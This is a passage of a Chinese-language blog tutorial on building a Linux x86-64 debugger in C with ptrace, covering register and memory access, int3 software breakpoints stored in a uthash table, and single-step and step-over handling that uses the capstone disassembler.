pid<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>regs<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/*locate reg_r`s index in user_regs_struct struct*/</span>    reg_descriptor_idx <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n_regs<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>g_register_descriptors<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>r <span class="token operator">==</span> r<span class="token punctuation">)</span><span class="token punctuation">{</span>            reg_descriptor_idx <span class="token operator">=</span> i<span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>regs <span class="token operator">+</span> reg_descriptor_idx<span class="token punctuation">)</span> <span class="token operator">=</span> value<span class="token punctuation">;</span>    <span class="token function">ptrace</span><span class="token punctuation">(</span>PTRACE_SETREGS<span class="token punctuation">,</span> pid<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>regs<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token class-name">uint64_t</span> <span class="token function">get_register_value</span><span class="token punctuation">(</span><span class="token class-name">pid_t</span> pid<span class="token punctuation">,</span> <span class="token keyword">enum</span> <span class="token class-name">reg</span> r<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">struct</span> <span class="token class-name">user_regs_struct</span> regs<span class="token punctuation">;</span>    <span class="token keyword">int</span> reg_descriptor_idx<span class="token punctuation">;</span>    <span class="token class-name">uint64_t</span> ret <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token function">ptrace</span><span class="token punctuation">(</span>PTRACE_GETREGS<span class="token punctuation">,</span> pid<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>regs<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/*locate reg_r`s index in user_regs_struct struct*/</span>    reg_descriptor_idx <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n_regs<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>g_register_descriptors<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>r <span class="token operator">==</span> r<span class="token punctuation">)</span><span class="token punctuation">{</span>            reg_descriptor_idx <span class="token operator">=</span> i<span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>reg_descriptor_idx <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        ret <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>regs <span class="token operator">+</span> reg_descriptor_idx<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> ret<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[error] get_register_value(%d, %d)\n"</span><span class="token punctuation">,</span> pid<span class="token punctuation">,</span> r<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> ret<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">/*辅助函数*/</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token function">get_register_name</span><span class="token punctuation">(</span><span class="token keyword">enum</span> <span class="token class-name">reg</span> r<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n_regs<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>g_register_descriptors<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>r <span class="token operator">==</span> r<span class="token punctuation">)</span>            <span class="token keyword">return</span> g_register_descriptors<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>name<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">enum</span> <span class="token class-name">reg</span> <span class="token function">get_register_from_name</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>name<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n_regs<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcasecmp</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> g_register_descriptors<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">return</span> g_register_descriptors<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>r<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>      <span class="token comment">/*-1 is impossible in reg_descriptor-&gt;r*/</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="读写内存"><a href="#读写内存" class="headerlink" title="读写内存"></a>读写内存</h3><p>​    读写内存和寄存器很类似，但使用ptrace一次性只能读写8字节(64位)：<code>ptrace(PTRACE_PEEKDATA, dbg-&gt;d_pid, address, NULL)</code>需要提供子进程的虚拟内存地址(address)</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token class-name">uint64_t</span> <span class="token function">dbg_read_memory</span><span class="token punctuation">(</span>Debugger <span class="token operator">*</span>dbg<span class="token punctuation">,</span> <span class="token class-name">uint64_t</span> address<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">ptrace</span><span class="token punctuation">(</span>PTRACE_PEEKDATA<span class="token punctuation">,</span> dbg<span class="token operator">-&gt;</span>d_pid<span class="token punctuation">,</span> address<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">dbg_write_memory</span><span class="token punctuation">(</span>Debugger <span class="token operator">*</span>dbg<span class="token punctuation">,</span> <span class="token class-name">uint64_t</span> address<span class="token punctuation">,</span> <span class="token class-name">uint64_t</span> value<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">ptrace</span><span class="token punctuation">(</span>PTRACE_POKEDATA<span class="token punctuation">,</span> dbg<span class="token operator">-&gt;</span>d_pid<span class="token punctuation">,</span> address<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="断点"><a href="#断点" class="headerlink" title="断点"></a>断点</h2><p>​    断点其实有两种：硬断点和软断点。其中硬断点涉及到CPU架构数量有限比如x86结构提供4个硬件断点(断点寄存器)，但可以检测读写执行三种情况。而软断点通过在指定位置插入<strong>断点指令</strong>，然后程序运行到此处执行断点指令让debugger获取<code>SIGTRAP</code>信号并停止运行，因此软断点可以有无数个；这里主要实现软断点，如x86的断点指令为<code>int 3</code>(机器码 0xcc)，需要考虑断点插入，断点记录，触发断点后如何继续运行等</p><p>使用如下结构体存储断点信息：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/** * breakpoints utils*/</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">Breakpoint</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> b_pid<span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> b_addr<span class="token punctuation">;</span>           <span class="token comment">//map key</span>    <span class="token keyword">int</span> b_enabled<span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> b_saved_data<span class="token punctuation">;</span><span class="token comment">//需要保存插入0xcc位置的数据</span>    UT_hash_handle hh<span class="token punctuation">;</span><span class="token punctuation">}</span>Breakpoint<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>借助[uthash](<a href="https://github.com/troydhanson/uthash">troydhanson/uthash: C macros for hash tables and more (github.com)</a>)开源项目实现一个hash表来记录断点信息，只需在结构体中包含<strong>UT_hash_handle</strong>成员即可；其提供宏HASH_FIND_PTR：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">HASH_FIND_PTR</span><span class="token expression"><span class="token punctuation">(</span>head<span class="token punctuation">,</span>findptr<span class="token punctuation">,</span>out<span class="token punctuation">)</span> <span class="token function">HASH_FIND</span><span class="token punctuation">(</span>hh<span class="token punctuation">,</span>head<span class="token punctuation">,</span>findptr<span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">,</span>out<span class="token punctuation">)</span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以通过结构体中的<strong>b_addr</strong>作为key，其表头在初始化<code>Debugger</code>结构体时设置为NULL即可：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">Debugger dbg<span class="token punctuation">;</span>dbg<span class="token punctuation">.</span>d_brks <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>       <span class="token comment">/* important! initialize to NULL related to breakpoints` map*/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>然后实现两个断点函数：brk_enable，brk_disable；分别进行插入断点和去除断点：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"utils.h"</span></span><span class="token keyword">void</span> <span class="token function">brk_enable</span><span class="token punctuation">(</span>Breakpoint <span class="token operator">*</span>bp<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> data <span class="token operator">=</span> <span class="token function">ptrace</span><span class="token punctuation">(</span>PTRACE_PEEKDATA<span class="token punctuation">,</span> bp<span class="token operator">-&gt;</span>b_pid<span class="token punctuation">,</span> bp<span class="token operator">-&gt;</span>b_addr<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    bp<span class="token operator">-&gt;</span>b_saved_data <span class="token operator">=</span> data <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">;</span>     <span class="token comment">//save LSB</span>    data <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>data <span class="token operator">&amp;</span> <span class="token operator">~</span><span class="token number">0xff</span><span class="token punctuation">)</span> <span class="token operator">|</span> INT3<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">ptrace</span><span class="token punctuation">(</span>PTRACE_POKEDATA<span class="token punctuation">,</span> bp<span class="token operator">-&gt;</span>b_pid<span class="token punctuation">,</span> bp<span class="token operator">-&gt;</span>b_addr<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">;</span>    bp<span class="token operator">-&gt;</span>b_enabled <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">brk_disable</span><span class="token punctuation">(</span>Breakpoint <span class="token operator">*</span>bp<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> data <span class="token operator">=</span> <span class="token function">ptrace</span><span class="token punctuation">(</span>PTRACE_PEEKDATA<span class="token punctuation">,</span> bp<span class="token operator">-&gt;</span>b_pid<span class="token punctuation">,</span> bp<span class="token operator">-&gt;</span>b_addr<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    data <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>data <span class="token operator">&amp;</span> <span class="token operator">~</span><span class="token number">0xff</span><span class="token punctuation">)</span> <span class="token operator">|</span> bp<span class="token operator">-&gt;</span>b_saved_data<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">ptrace</span><span class="token punctuation">(</span>PTRACE_POKEDATA<span class="token punctuation">,</span> bp<span class="token operator">-&gt;</span>b_pid<span class="token punctuation">,</span> bp<span class="token operator">-&gt;</span>b_addr<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">;</span>    bp<span class="token operator">-&gt;</span>b_enabled <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="单步"><a href="#单步" class="headerlink" title="单步"></a>单步</h2><p>​    单步运行时除了普通指令，需要考虑是否跳过函数调用(<strong>call</strong>)也就是需要<strong>步过</strong>的情况，还有如果当前为断点处单步时需要格外的断点处理。基于<code>ptrace(PTRACE_SINGLESTEP, ...)</code>单步步入时需要考虑两种情况，涉及断点；其他非断点情况直接<code>PTRACE_SINGLESTEP</code>单步运行即可</p><ul><li>pc刚好触发一个断点，即执行了<code>0xcc</code></li><li>pc即将触发一个断点</li></ul><p>使用如下函数处理单步命令：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/*we can show UI here*/</span><span class="token keyword">void</span> <span class="token function">dbg_step_in</span><span class="token punctuation">(</span>Debugger <span class="token operator">*</span>dbg<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token class-name">uint64_t</span> possible_pc <span class="token operator">=</span> <span class="token function">get_pc</span><span class="token punctuation">(</span>dbg<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token comment">/*if this is breakpoint int 3 executed*/</span>    Breakpoint <span class="token operator">*</span>bp <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token function">HASH_FIND_PTR</span><span class="token punctuation">(</span>dbg<span class="token operator">-&gt;</span>d_brks<span class="token punctuation">,</span> <span class="token operator">&amp;</span>possible_pc<span class="token punctuation">,</span> bp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>bp <span class="token operator">!=</span> <span class="token constant">NULL</span> <span class="token operator">&amp;&amp;</span> bp<span class="token operator">-&gt;</span>b_enabled<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token comment">/*step over breakpoint*/</span>        <span class="token function">brk_disable</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">set_pc</span><span class="token punctuation">(</span>dbg<span class="token punctuation">,</span> possible_pc<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">ptrace</span><span class="token punctuation">(</span>PTRACE_SINGLESTEP<span class="token punctuation">,</span> dbg<span class="token operator">-&gt;</span>d_pid<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">wait_for_signal</span><span class="token punctuation">(</span>dbg<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">brk_enable</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token function">ptrace</span><span class="token punctuation">(</span>PTRACE_SINGLESTEP<span class="token punctuation">,</span> dbg<span class="token operator">-&gt;</span>d_pid<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">wait_for_signal</span><span class="token punctuation">(</span>dbg<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">show_UI</span><span class="token punctuation">(</span>dbg<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>但是后来发现一个bug：当断点设置在一个单机器码的指令处时(如 push rbp 0x55)，以上逻辑会陷入死循环，因为每次单步时都会检测<code>pc-1</code>是否为断点；所以得想办法面对单机器码断点的情况避免该逻辑，不可能把所有单机器码指令全列出来然后比对，所以这里使用反编译引擎<strong>capstone</strong>。如果pc-1是个断点那么先判断pc-1处的指令长度是否为1，如果是那么设置一个静态flag表示已经步过一个单机器码的断点下一次单步时不再考虑pc-1：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/** * This function invoked in situation: * 1.PTRACE_SINGLESTEP the current instruction which maybe inserted a breakpoint OR maybe not * 2.already triggered a breakpoint(0xcc) PTRACE_SINGLESTEP the broken instruction * we can show UI here*/</span><span class="token keyword">void</span> <span class="token function">dbg_step_in</span><span class="token punctuation">(</span>Debugger <span class="token operator">*</span>dbg<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">static</span> bool one_machine_code_flag <span class="token operator">=</span> false<span class="token punctuation">;</span>    <span class="token class-name">uint64_t</span> possible_pc<span class="token punctuation">,</span> data<span class="token punctuation">;</span>    Breakpoint <span class="token operator">*</span>bp <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    csh handle <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    cs_insn<span class="token operator">*</span> insn<span class="token punctuation">;</span>    <span class="token class-name">size_t</span> count<span class="token punctuation">;</span>    <span class="token keyword">int</span> child_status<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>one_machine_code_flag<span class="token punctuation">)</span><span class="token punctuation">{</span>        possible_pc <span class="token operator">=</span> <span class="token function">get_pc</span><span class="token punctuation">(</span>dbg<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>          <span class="token comment">/*if this is breakpoint int 3 executed*/</span>        <span class="token function">HASH_FIND_PTR</span><span class="token punctuation">(</span>dbg<span class="token operator">-&gt;</span>d_brks<span class="token punctuation">,</span> <span class="token operator">&amp;</span>possible_pc<span class="token punctuation">,</span> bp<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>bp <span class="token operator">!=</span> <span class="token constant">NULL</span> <span class="token operator">&amp;&amp;</span> bp<span class="token operator">-&gt;</span>b_enabled<span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token function">brk_disable</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">/*check for single machine code instruction*/</span>            data <span class="token operator">=</span> <span class="token function">ptrace</span><span class="token punctuation">(</span>PTRACE_PEEKDATA<span class="token punctuation">,</span> dbg<span class="token operator">-&gt;</span>d_pid<span class="token punctuation">,</span> possible_pc<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">cs_open</span><span class="token punctuation">(</span>CS_ARCH_X86<span class="token punctuation">,</span> CS_MODE_64<span class="token punctuation">,</span> <span class="token operator">&amp;</span>handle<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[error]: Failed to initialize capstone engine!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token function">cs_disasm</span><span class="token punctuation">(</span>handle<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>data<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">0x1000</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>insn<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>insn<span class="token operator">-&gt;</span>size <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                one_machine_code_flag <span class="token operator">=</span> true<span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>                one_machine_code_flag <span class="token operator">=</span> false<span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token function">set_pc</span><span class="token punctuation">(</span>dbg<span class="token punctuation">,</span> possible_pc<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">ptrace</span><span class="token punctuation">(</span>PTRACE_SINGLESTEP<span class="token punctuation">,</span> dbg<span class="token operator">-&gt;</span>d_pid<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">wait_for_signal</span><span class="token punctuation">(</span>dbg<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">brk_enable</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token comment">/*if we are here then this`s caused by PTRACE_SINGLESTEP and maybe we going to trigger a breakpoint or maybe not*/</span>            possible_pc <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>            one_machine_code_flag <span class="token operator">=</span> false<span class="token punctuation">;</span>            <span class="token function">HASH_FIND_PTR</span><span class="token punctuation">(</span>dbg<span class="token operator">-&gt;</span>d_brks<span class="token punctuation">,</span> <span class="token operator">&amp;</span>possible_pc<span class="token punctuation">,</span> bp<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>bp <span class="token operator">!=</span> <span class="token constant">NULL</span> <span class="token operator">&amp;&amp;</span> bp<span class="token operator">-&gt;</span>b_enabled<span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token function">brk_disable</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">ptrace</span><span class="token punctuation">(</span>PTRACE_SINGLESTEP<span class="token punctuation">,</span> dbg<span class="token operator">-&gt;</span>d_pid<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">wait_for_signal</span><span class="token punctuation">(</span>dbg<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">brk_enable</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>                <span class="token function">ptrace</span><span class="token punctuation">(</span>PTRACE_SINGLESTEP<span class="token punctuation">,</span> dbg<span class="token operator">-&gt;</span>d_pid<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">wait_for_signal</span><span class="token punctuation">(</span>dbg<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>           <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token comment">/*the previous instruction is a single machine code instruction and breakpoint*/</span>        possible_pc <span class="token operator">=</span> <span class="token function">get_pc</span><span class="token punctuation">(</span>dbg<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">/*check current pc*/</span>        one_machine_code_flag <span class="token operator">=</span> false<span class="token punctuation">;</span>        <span class="token function">HASH_FIND_PTR</span><span class="token punctuation">(</span>dbg<span class="token operator">-&gt;</span>d_brks<span class="token punctuation">,</span> <span class="token operator">&amp;</span>possible_pc<span class="token punctuation">,</span> bp<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>bp <span class="token operator">!=</span> <span class="token constant">NULL</span> <span class="token operator">&amp;&amp;</span> bp<span class="token operator">-&gt;</span>b_enabled<span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token function">brk_disable</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">ptrace</span><span class="token punctuation">(</span>PTRACE_SINGLESTEP<span class="token punctuation">,</span> dbg<span class="token operator">-&gt;</span>d_pid<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">wait_for_signal</span><span class="token punctuation">(</span>dbg<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">brk_enable</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token function">ptrace</span><span class="token punctuation">(</span>PTRACE_SINGLESTEP<span class="token punctuation">,</span> dbg<span class="token operator">-&gt;</span>d_pid<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">wait_for_signal</span><span class="token punctuation">(</span>dbg<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token function">show_UI</span><span class="token punctuation">(</span>dbg<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>​    步过主要用在函数调用上，在使用步过时主要考虑以下几种情况：</p><ul><li>pc触发了需要步过的call指令上的断点，即pc执行了0xcc</li><li>pc即将步过的call指令上被插入了断点</li><li>其他就是单步情况</li></ul><p>这里步过一个call采用的方式是在call指令下一条指令下断点然后PTRACE_CONT。同样使用capstone计算call指令长度然后断下后面一条指令，这样需要考虑如果被step over的函数如果没有中断那么将触发call指令后面一条指令，<strong>那么INT3被执行还需让pc-1</strong></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/** * This function invoked in 4 situation: * 1.Just work as step in * 2.jump over a call but has triggered an breakpoint(0xcc) * 3.jump over a call but no breakpoint in current call instruction * 4.jump over a call but there is 0xcc in current call instruction * we can show UI here*/</span><span class="token keyword">void</span> <span 